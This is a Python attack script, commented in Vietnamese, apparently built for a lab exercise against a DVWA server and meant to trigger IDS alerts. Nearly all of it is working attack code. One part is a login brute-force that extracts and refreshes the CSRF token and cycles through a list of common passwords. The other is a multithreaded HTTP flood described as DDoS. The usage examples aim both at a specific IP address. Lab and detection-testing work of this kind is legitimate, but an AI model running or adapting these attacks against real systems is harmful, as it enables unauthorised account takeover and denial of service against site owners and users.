#!/usr/bin/env python3
"""
DVWA Attack Script - Tấn công DVWA trên Kali 2
================================================
Script để giả lập tấn công Brute Force và DDoS đến DVWA server.

Cách dùng:
    python3 attack_dvwa.py --type bruteforce --target http://100.110.195.59/dvwa
    python3 attack_dvwa.py --type ddos --target http://100.110.195.59/dvwa --count 1000
    python3 attack_dvwa.py --type all --target http://100.110.195.59/dvwa

Yêu cầu:
    pip3 install requests
"""

import argparse
import time
import random
import threading
import sys
from datetime import datetime

try:
    import requests
except ImportError:
    print("Error: requests module not found. Install with: pip3 install requests")
    sys.exit(1)


# ── Cấu hình mặc định ───────────────────────────────────────────────────────
DEFAULT_TARGET = "http://localhost/dvwa"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "letmein",
    "welcome", "monkey", "dragon", "master", "hello",
    "freedom", "whatever", "qazwsx", "trustno1", "123456789",
    "12345678", "12345", "1234567", "1234567890", "password1",
    "admin123", "qwerty", "abc123", "password123", "adminadmin"
]


class Color:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    NC = '\033[0m'


def print_header():
    print(f"\n{Color.YELLOW}{'='*60}")
    print(f"  DVWA Attack Script - Tấn công DVWA Server")
    print(f"{'='*60}{Color.NC}\n")


def brute_force_attack(target_url: str, username: str, passwords: list, delay: float = 0.5):
    """
    Brute force attack vào DVWA login page.
    """
    login_url = f"{target_url}/login.php"
    
    print(f"{Color.BLUE}[+] Target: {login_url}")
    print(f"[+] Username: {username}")
    print(f"[+] Passwords to try: {len(passwords)}")
    print(f"[+] Delay: {delay}s between attempts\n{Color.NC}")
    
    # Get session and CSRF token
    try:
        session = requests.Session()
        response = session.get(login_url, timeout=10)
        
        if response.status_code != 200:
            print(f"{Color.RED}[-] Cannot access login page: {response.status_code}{Color.NC}")
            return
        
        # Extract CSRF token (DVWA uses user_token)
        csrf_token = ""
        if 'user_token' in response.text:
            import re
            match = re.search(r"user_token'\s*value='([a-f0-9]+)'", response.text)
            if match:
                csrf_token = match.group(1)
                print(f"{Color.GREEN}[+] CSRF Token: {csrf_token}{Color.NC}")
        
        print(f"{Color.YELLOW}[*] Starting brute force attack...{Color.NC}\n")
        
        success = False
        for idx, password in enumerate(passwords, 1):
            payload = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': csrf_token
            }
            
            try:
                response = session.post(login_url, data=payload, timeout=5)
                
                # Check if login successful (redirect to index.php)
                if response.status_code == 302 or 'index.php' in response.url:
                    print(f"{Color.GREEN}[+] SUCCESS! Password found: {password} (attempt {idx}/{len(passwords)}){Color.NC}")
                    success = True
                    break
                else:
                    print(f"[-] Attempt {idx}/{len(passwords)}: {password} - Failed", end='\r')
                
                # Refresh CSRF token for next attempt
                if idx % 10 == 0:
                    response = session.get(login_url, timeout=5)
                    match = re.search(r"user_token'\s*value='([a-f0-9]+)'", response.text)
                    if match:
                        csrf_token = match.group(1)
                
                time.sleep(delay)
                
            except requests.RequestException as e:
                print(f"{Color.RED}[-] Error on attempt {idx}: {e}{Color.NC}")
                time.sleep(delay)
        
        print()
        if not success:
            print(f"{Color.RED}[-] Brute force completed. Password not found in list.{Color.NC}")
        else:
            print(f"{Color.GREEN}[+] Brute force successful!{Color.NC}")
            
    except requests.RequestException as e:
        print(f"{Color.RED}[-] Connection error: {e}{Color.NC}")


def ddos_attack(target_url: str, count: int, threads: int = 10):
    """
    DDoS attack bằng cách gửi nhiều HTTP requests đồng thời.
    """
    print(f"{Color.BLUE}[+] Target: {target_url}")
    print(f"[+] Total requests: {count}")
    print(f"[+] Threads: {threads}")
    print(f"{Color.YELLOW}[*] Starting DDoS attack...{Color.NC}\n")
    
    results = {'success': 0, 'failed': 0, 'total': 0}
    lock = threading.Lock()
    
    def worker():
        while True:
            with lock:
                if results['total'] >= count:
                    break
                results['total'] += 1
                current = results['total']
            
            try:
                # Random endpoints to make it more realistic
                endpoints = ['/', '/login.php', '/index.php', '/security.php', '/vulnerabilities/']
                endpoint = random.choice(endpoints)
                url = f"{target_url}{endpoint}"
                
                response = requests.get(url, timeout=3)
                
                with lock:
                    if response.status_code < 500:
                        results['success'] += 1
                    else:
                        results['failed'] += 1
                
                if current % 50 == 0:
                    print(f"[*] Progress: {current}/{count} requests (Success: {results['success']}, Failed: {results['failed']})", end='\r')
                
            except requests.RequestException:
                with lock:
                    results['failed'] += 1
            
            # Small random delay
            time.sleep(random.uniform(0.01, 0.1))
    
    # Start threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)
    
    # Wait for all threads
    for t in thread_list:
        t.join()
    
    print()
    print(f"{Color.GREEN}[+] DDoS attack completed!{Color.NC}")
    print(f"    Total requests: {results['total']}")
    print(f"    Successful: {results['success']}")
    print(f"    Failed: {results['failed']}")


def main():
    parser = argparse.ArgumentParser(
        description="DVWA Attack Script - Tấn công DVWA Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python3 attack_dvwa.py --type bruteforce --target http://100.110.195.59/dvwa
    python3 attack_dvwa.py --type ddos --target http://100.110.195.59/dvwa --count 1000
    python3 attack_dvwa.py --type all --target http://100.110.195.59/dvwa
    python3 attack_dvwa.py --type bruteforce --target http://100.110.195.59/dvwa --username admin --custom-pass passwords.txt
        """
    )
    
    parser.add_argument(
        "--type",
        choices=["bruteforce", "ddos", "all"],
        required=True,
        help="Loại tấn công"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"URL của DVWA (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--username",
        default=DEFAULT_USERNAME,
        help=f"Username cho brute force (default: {DEFAULT_USERNAME})"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=500,
        help="Số requests cho DDoS (default: 500)"
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Số threads cho DDoS (default: 10)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay giữa các brute force attempts (giây, default: 0.5)"
    )
    parser.add_argument(
        "--custom-pass",
        help="File chứa danh sách password tùy chỉnh"
    )
    
    args = parser.parse_args()
    
    print_header()
    
    # Load passwords
    passwords = DEFAULT_PASSWORDS
    if args.custom_pass:
        try:
            with open(args.custom_pass, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Color.GREEN}[+] Loaded {len(passwords)} passwords from {args.custom_pass}{Color.NC}\n")
        except FileNotFoundError:
            print(f"{Color.RED}[-] Password file not found: {args.custom_pass}{Color.NC}")
            print(f"[*] Using default passwords\n")
    
    # Execute attacks
    if args.type == "bruteforce" or args.type == "all":
        print(f"{Color.YELLOW}{'='*60}")
        print(f"  BRUTE FORCE ATTACK")
        print(f"{'='*60}{Color.NC}\n")
        brute_force_attack(args.target, args.username, passwords, args.delay)
        print()
    
    if args.type == "ddos" or args.type == "all":
        if args.type == "all":
            time.sleep(2)
        print(f"{Color.YELLOW}{'='*60}")
        print(f"  DDOS ATTACK")
        print(f"{'='*60}{Color.NC}\n")
        ddos_attack(args.target, args.count, args.threads)
        print()
    
    print(f"{Color.GREEN}[+] All attacks completed!{Color.NC}")
    print(f"[*] Check DVWA logs and IDS dashboard for alerts\n")


if __name__ == "__main__":
    main()
